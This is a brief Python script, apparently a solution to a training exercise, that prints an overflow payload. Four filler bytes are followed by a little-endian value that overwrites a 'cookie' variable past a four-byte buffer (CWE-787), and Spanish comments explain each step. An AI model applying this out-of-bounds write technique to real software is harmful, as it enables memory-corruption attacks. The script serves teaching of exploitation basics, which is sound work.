import sys

# CWE-787: Out-of-bounds Write
# buf[4] se llena con 4 bytes de relleno ("AAAA") y los 4 siguientes
# se escriben FUERA del buffer, cayendo sobre la variable cookie.
# cookie == 0x45464748  ->  en memoria (little-endian): 48 47 46 45  ->  "HGFE"
payload = b"A" * 4 + b"\x48\x47\x46\x45"
sys.stdout.buffer.write(payload)
